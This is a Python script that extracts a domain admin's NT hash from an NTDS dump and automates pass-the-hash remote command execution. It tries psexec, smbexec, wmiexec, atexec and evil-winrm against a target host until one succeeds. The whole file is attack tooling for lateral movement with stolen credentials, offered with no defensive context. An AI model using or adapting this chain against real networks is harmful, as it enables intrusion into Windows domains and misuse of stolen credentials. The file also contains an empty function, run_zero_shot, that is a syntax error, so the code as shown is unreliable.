#!/usr/bin/env python3
import subprocess
import re
import sys

def run_zero_shot():
    

def parse_input(text):
    """
    Extract hostname, domain, DA username, nthash, and target IP.
    """

    # hostname + domain
    m = re.search(r"hostname:\s*([A-Za-z0-9\-$]+),\s*domain:\s*([A-Za-z0-9\.\-]+)", text)
    hostname = m.group(1).rstrip("$") if m else None
    domain = m.group(2) if m else None

    # FIRST NTDS dump credential line
    # Example: Administrator:500:<LM32>:<NT32>:::
    # Or any DA (e.g., "CORTEX$:1000:...").
    cred = re.search(
        r"^([A-Za-z0-9\.\$\-_]+):\d+:[0-9a-fA-F]{32}:([0-9a-fA-F]{32}):::",
        text,
        re.MULTILINE
    )

    if cred:
        user = cred.group(1)
        nthash = cred.group(2)
    else:
        user = None
        nthash = None

    # Target IP from filenames like: "SOMENAME_10.0.0.5_domain_admins.ntds"
    ipm = re.search(r"_(\d{1,3}(?:\.\d{1,3}){3})_", text)
    ip = ipm.group(1) if ipm else None

    return {
        "hostname": hostname,
        "domain": domain,
        "user": user,
        "nthash": nthash,
        "ip": ip,
    }


def build_cmd(tool, domain, user, target, nthash, command):
    h = f":{nthash}"

    if tool == "psexec":
        return ["psexec.py", f"{domain}/{user}@{target}", "-hashes", h, command]

    if tool == "smbexec":
        return ["smbexec.py", f"{domain}/{user}@{target}", "-hashes", h, command]

    if tool == "wmiexec":
        return ["wmiexec.py", f"{domain}/{user}@{target}", "-hashes", h, command]

    if tool == "atexec":
        return ["atexec.py", f"{domain}/{user}@{target}", "-hashes", h, command]

    if tool == "winrm":
        # Evil-WinRM is interactive only
        return ["evil-winrm", "-i", target, "-u", user, "-H", nthash]

    raise Exception(f"Unknown tool: {tool}")


def run_chain(domain, user, target, nthash, command):
    chain = ["psexec", "smbexec", "wmiexec", "atexec", "winrm"]

    for tool in chain:
        cmd = build_cmd(tool, domain, user, target, nthash, command)
        print(f"\n=== Trying {tool}: {' '.join(cmd)} ===\n")

        try:
            proc = subprocess.Popen(cmd)
            rc = proc.wait()
        except Exception:
            rc = -1

        if rc == 0:
            print(f"{tool} succeeded.")
            return tool

        print(f"{tool} failed.")

    return None


def main():
    if len(sys.argv) < 2:
        print("Usage: chain.py <inputfile> [command]")
        sys.exit(1)

    inputfile = sys.argv[1]
    command = " ".join(sys.argv[2:]) if len(sys.argv) > 2 else "whoami"

    data = open(inputfile, "r", errors="ignore").read()
    parsed = parse_input(data)

    # Validate results
    if not parsed["domain"] or not parsed["user"] or not parsed["nthash"] or not parsed["ip"]:
        print("Parsing failed:")
        print(parsed)
        sys.exit(1)

    print("Parsed:")
    for k, v in parsed.items():
        print(f"{k}: {v}")

    run_chain(parsed["domain"], parsed["user"], parsed["ip"], parsed["nthash"], command)


if __name__ == "__main__":
    main()
